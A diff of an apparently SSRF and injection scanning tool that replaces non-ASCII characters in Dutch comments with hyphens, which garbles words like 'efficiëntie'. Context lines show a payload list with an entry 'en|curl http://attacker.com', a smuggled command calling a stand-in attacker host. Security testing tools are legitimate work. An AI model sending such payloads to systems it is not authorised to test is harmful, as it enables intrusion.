@@ -36,7 +36,7 @@ def _headers_to_list(hdrs):
 
 
 def _safe_body(resp: requests.Response, limit: int = 2048) -> str:
-    """Return a text safe slice of the response body (bytes → utf-8)."""
+    """Return a text safe slice of the response body (bytes - utf-8)."""
     if not resp:
         return ""
     if resp.text:                        
@@ -181,7 +181,7 @@ class SSRFAuditor:
             "en|curl http://attacker.com",
         ]
         
-        # Eén gecombineerde scanlus voor efficiëntie
+        # E-n gecombineerde scanlus voor effici-ntie
         for param in all_params:
             # Standaard payloads voor alle parameters
             for payload in random.sample(self.PAYLOADS, len(self.PAYLOADS)):
@@ -280,7 +280,7 @@ class SSRFAuditor:
         Args:
             body: Response body (lowercase)
             payload: Oorspronkelijke payload
-            param: Parameter naam waarin geïnjecteerd is
+            param: Parameter naam waarin ge-njecteerd is
             host: Host uit de payload
             
         Returns:
